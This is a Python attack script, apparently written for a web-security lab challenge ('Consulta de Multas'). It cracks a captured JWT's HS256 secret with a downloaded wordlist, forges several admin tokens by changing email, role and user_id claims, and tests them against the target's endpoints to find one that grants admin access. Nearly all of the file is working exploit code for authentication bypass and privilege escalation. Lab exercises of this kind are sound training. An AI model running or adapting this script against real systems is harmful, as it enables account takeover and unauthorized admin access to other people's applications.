#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Laboratorio "Consulta de Multas" - Fuerza bruta de clave JWT + generación de token admin
No necesita extraer cookies del navegador: el JWT se pasa directo.
"""

import base64
import hmac
import hashlib
import json
import os
import sys
import time

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    print("[-] Falta el modulo 'requests'. Instalalo con: pip install requests")
    sys.exit(1)

# ============================================================
# CONFIGURACION - Editar si es necesario
# ============================================================
WEB_URL = "https://chl-3b00e175-38f0-4e71-96fe-63e448fc05d5-consulta-multas.softwareseguro.com.ar"

# JWT capturado del login de Ignacio (cookie auth)
JWT = (
    "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9."
    "eyJ1c2VyX2lkIjoxLCJ1c2VybmFtZSI6ImlnbmFjaW9fMTIzQHlvcG1haWwuY29tIiwiZXhwIjoxNzk0NTE2"
    "OTM5LCJlbWFpbCI6ImlnbmFjaW9fMTIzQHlvcG1haWwuY29tIiwib3JpZ19pYXQiOjE3OTM5MTIxMzl9."
    "9Z8_xvwdKRzdTYYYbhqxKvwS7osSLQG3ohQ69wkwCkY"
)

ADMIN_EMAIL = "administrador_multas@yopmail.com"

# Cookie cf_clearance (opcional). Si Cloudflare bloquea los GET, pegala aca.
CF_CLEARANCE = ""

WORDLIST_URL = "https://raw.githubusercontent.com/wallarm/jwt-secrets/master/jwt.secrets.list"
WORDLIST_LOCAL = "jwt.secrets.list"

# Lista minima de respaldo por si no hay internet
MINI_SECRETS = [
    "secret", "secret1", "secret2", "secretkey", "secret_key", "password",
    "123456", "12345678", "123456789", "admin", "admin123", "root",
    "jwt-secret", "jwtsecret", "jwt_secret", "supersecret", "super-secret",
    "mysecret", "my-secret", "changeme", "change-me", "test", "testing",
    "token", "auth", "multas", "consulta", "multas-secret", "multas_secret",
    "softwareseguro", "software-seguro", "ignacio", "ignacio123",
    "your-256-bit-secret", "thisisthesecretkey", "s3cr3t", "s3cr3t0",
]


# ============================================================
# Utilidades base64url
# ============================================================
def b64url_decode_bytes(data: str) -> bytes:
    data = data.replace("-", "+").replace("_", "/")
    data += "=" * (-len(data) % 4)
    return base64.b64decode(data)


def b64url_decode_json(data: str) -> dict:
    return json.loads(b64url_decode_bytes(data).decode("utf-8"))


def b64url_encode_str(data: str) -> str:
    return base64.urlsafe_b64encode(data.encode("utf-8")).decode("utf-8").rstrip("=")


def b64url_encode_bytes(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).decode("utf-8").rstrip("=")


def sign_hs256(secret: str, signing_input: str) -> str:
    digest = hmac.new(secret.encode("utf-8"), signing_input.encode("utf-8"), hashlib.sha256).digest()
    return b64url_encode_bytes(digest)


# ============================================================
# PASO 0 - Mostrar estructura del JWT
# ============================================================
print("=" * 64)
print(" PASO 0: Estructura del JWT capturado")
print("=" * 64)

parts = JWT.split(".")
if len(parts) != 3:
    print("[-] El JWT no tiene 3 partes. Revisa que lo copiaste completo.")
    sys.exit(1)

header_b64, payload_b64, signature_b64 = parts

try:
    header = b64url_decode_json(header_b64)
    payload = b64url_decode_json(payload_b64)
except Exception as e:
    print(f"[-] No se pudo decodificar el JWT: {e}")
    sys.exit(1)

print("Header:")
print(json.dumps(header, indent=4, ensure_ascii=False))
print("\nPayload:")
print(json.dumps(payload, indent=4, ensure_ascii=False))

alg = header.get("alg", "HS256")
if alg != "HS256":
    print(f"\n[!] Ojo: el algoritmo es {alg}, no HS256. Este script solo firma HS256.")

print(f"\n[+] Algoritmo de firma: {alg}")


# ============================================================
# PASO 1 - Obtener la wordlist
# ============================================================
print("\n" + "=" * 64)
print(" PASO 1: Cargando wordlist de secretos")
print("=" * 64)

secrets = []

if os.path.isfile(WORDLIST_LOCAL):
    print(f"[+] Usando wordlist local: {WORDLIST_LOCAL}")
    with open(WORDLIST_LOCAL, "r", encoding="utf-8", errors="ignore") as f:
        secrets = [line.strip() for line in f if line.strip()]
else:
    print(f"[+] Descargando wordlist: {WORDLIST_URL}")
    try:
        r = requests.get(WORDLIST_URL, timeout=20)
        r.raise_for_status()
        secrets = [line.strip() for line in r.text.splitlines() if line.strip()]
        # Guardar para proxima vez
        with open(WORDLIST_LOCAL, "w", encoding="utf-8") as f:
            f.write("\n".join(secrets))
        print(f"[+] Wordlist guardada en {WORDLIST_LOCAL}")
    except Exception as e:
        print(f"[!] No se pudo descargar la wordlist ({e}).")
        print("[!] Se usara la lista minima integrada.")

# Asegurar que las minimas esten primero (mas rapido si coincide)
combined = []
seen = set()
for s in MINI_SECRETS + secrets:
    if s not in seen:
        seen.add(s)
        combined.append(s)
secrets = combined

print(f"[+] Total de secretos a probar: {len(secrets)}")


# ============================================================
# PASO 2 - Fuerza bruta de la clave
# ============================================================
print("\n" + "=" * 64)
print(" PASO 2: Fuerza bruta de la clave secreta")
print("=" * 64)

signing_input = f"{header_b64}.{payload_b64}"
found_secret = None
start = time.time()

for i, secret in enumerate(secrets, 1):
    if sign_hs256(secret, signing_input) == signature_b64:
        found_secret = secret
        print(f"\n[+] CLAVE ENCONTRADA en la linea {i}: '{secret}'")
        break
    if i % 5000 == 0:
        elapsed = time.time() - start
        print(f"    ... probados {i}/{len(secrets)} ({elapsed:.1f}s)")

if not found_secret:
    print("\n[-] No se encontro la clave en la wordlist.")
    print("    Posibilidades:")
    print("      - La clave no esta en la lista (probar otra wordlist).")
    print("      - El servidor usa otra variante (verificar alg en el header).")
    sys.exit(1)


# ============================================================
# PASO 3 - Generar candidatos de token admin
# ============================================================
print("\n" + "=" * 64)
print(" PASO 3: Generando tokens candidatos (admin)")
print("=" * 64)

# Header: mantener el original pero reordenar de forma canonica
# notar que el original tiene typ primero: {"typ":"JWT","alg":"HS256"}
new_header_obj = {"typ": header.get("typ", "JWT"), "alg": alg}
new_header_b64 = b64url_encode_str(json.dumps(new_header_obj, separators=(",", ":")))


def make_token(payload_obj: dict) -> str:
    payload_str = json.dumps(payload_obj, separators=(",", ":"))
    payload_b64_new = b64url_encode_str(payload_str)
    sig = sign_hs256(found_secret, f"{new_header_b64}.{payload_b64_new}")
    return f"{new_header_b64}.{payload_b64_new}.{sig}"


candidates = []

base = dict(payload)  # copia del payload original

# Candidato 1: email y username = admin, mismo user_id
c1 = dict(base)
c1["email"] = ADMIN_EMAIL
c1["username"] = ADMIN_EMAIL
candidates.append(("email+username=admin, user_id=%s" % c1.get("user_id"), c1))

# Candidato 2: email=admin pero username original
c2 = dict(base)
c2["email"] = ADMIN_EMAIL
candidates.append(("email=admin, username=ignacio", c2))

# Candidato 3: agregar role=admin manteniendo todo
c3 = dict(base)
c3["role"] = "admin"
c3["is_admin"] = True
candidates.append(("role=admin + is_admin=true (email ignacio)", c3))

# Candidato 4: email admin + role admin
c4 = dict(base)
c4["email"] = ADMIN_EMAIL
c4["username"] = ADMIN_EMAIL
c4["role"] = "admin"
c4["is_admin"] = True
candidates.append(("email=admin + role=admin", c4))

# Candidato 5: user_id = 0 con email admin
c5 = dict(base)
c5["user_id"] = 0
c5["email"] = ADMIN_EMAIL
c5["username"] = ADMIN_EMAIL
candidates.append(("user_id=0 + email admin", c5))

# Candidato 6: user_id = 2 con email admin
c6 = dict(base)
c6["user_id"] = 2
c6["email"] = ADMIN_EMAIL
c6["username"] = ADMIN_EMAIL
candidates.append(("user_id=2 + email admin", c6))

# Candidato 7: user_id = 1 pero admin flags
c7 = dict(base)
c7["admin"] = True
c7["is_admin"] = True
c7["role"] = "admin"
candidates.append(("flags admin, user_id=1", c7))

print(f"[+] Generados {len(candidates)} candidatos.")

for idx, (desc, cand_payload) in enumerate(candidates, 1):
    tok = make_token(cand_payload)
    print(f"\n--- Candidato {idx}: {desc} ---")
    print(tok[:120] + "...")

# Guardar todos en un archivo por si acaso
with open("tokens_admin_candidatos.txt", "w", encoding="utf-8") as f:
    for idx, (desc, cand_payload) in enumerate(candidates, 1):
        tok = make_token(cand_payload)
        f.write(f"# Candidato {idx}: {desc}\n{tok}\n\n")
print("\n[+] Todos los tokens guardados en tokens_admin_candidatos.txt")


# ============================================================
# PASO 4 - Probar los tokens contra el servidor
# ============================================================
print("\n" + "=" * 64)
print(" PASO 4: Probando tokens contra el servidor")
print("=" * 64)

session = requests.Session()
session.verify = False
session.headers.update({
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:159.0) Gecko/20100101 Firefox/159.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-AR,es;q=0.9,en-US;q=0.8,en;q=0.7",
})

if CF_CLEARANCE:
    session.cookies.set("cf_clearance", CF_CLEARANCE)

def test_token(tok: str):
    """Devuelve (perfil_status, multas_status, indicios)"""
    session.cookies.set("auth", tok)
    try:
        r_perfil = session.get(f"{WEB_URL}/perfil/", timeout=15, allow_redirects=False)
    except Exception as e:
        r_perfil = None
    try:
        r_multas = session.get(
            f"{WEB_URL}/multas/",
            timeout=15,
            allow_redirects=False,
            headers={"Accept": "*/*", "X-Requested-With": "XMLHttpRequest"},
        )
    except Exception as e:
        r_multas = None

    ps = r_perfil.status_code if r_perfil is not None else "ERR"
    ms = r_multas.status_code if r_multas is not None else "ERR"

    body = ""
    if r_multas is not None:
        body = r_multas.text or ""
    elif r_perfil is not None:
        body = r_perfil.text or ""

    # Heuristicas de exito
    indicios = []
    low = body.lower()
    for palabra in ["admin", "administrador", "multa", "ignacio", "pagar", "pagada", "eliminar", "todas"]:
        if palabra in low:
            indicios.append(palabra)

    return ps, ms, indicios, body[:300], r_multas.headers.get("Content-Type", "") if r_multas is not None else ""


overall_best = None

for idx, (desc, cand_payload) in enumerate(candidates, 1):
    tok = make_token(cand_payload)
    ps, ms, indicios, preview, ctype = test_token(tok)
    print(f"\n[+] Candidato {idx} ({desc})")
    print(f"    /perfil/ -> {ps}   |   /multas/ -> {ms}   |   Content-Type: {ctype}")
    if indicios:
        print(f"    Indicios en el body: {indicios}")
        print(f"    Preview: {preview[:200].replace(chr(10), ' ')}")

    # Consideramos exito si /multas/ es 200 y no es redireccion a login
    if ms == 200:
        if overall_best is None:
            overall_best = (idx, desc, tok, ms, indicios)
        # Si ademas hay indicios de admin/multas, es muy probable
        if any(p in indicios for p in ["admin", "administrador", "pagar", "todas"]):
            overall_best = (idx, desc, tok, ms, indicios)
            break


print("\n" + "=" * 64)
print(" RESULTADO")
print("=" * 64)

if overall_best:
    idx, desc, tok, ms, indicios = overall_best
    print(f"[+] Mejor candidato: #{idx} - {desc}")
    print(f"[+] /multas/ respondio 200")
    print(f"[+] Indicios: {indicios}")
    print(f"\n[+] TOKEN GANADOR:\n{tok}")
    print("\n[+] Usalo en Burp como cookie:  auth=<TOKEN>")
else:
    print("[-] Ningun candidato devolvio 200 en /multas/.")
    print("    Posibles causas:")
    print("      - Cloudflare bloquea las peticiones (falta cf_clearance).")
    print("      - La autorizacion no se basa en email/username.")
    print("      - Hace falta otro claim (revisar el panel de admin con el token original).")
    print("\n    Sugerencia: probar los tokens de tokens_admin_candidatos.txt a mano en Burp.")

print("\n[+] Fin.")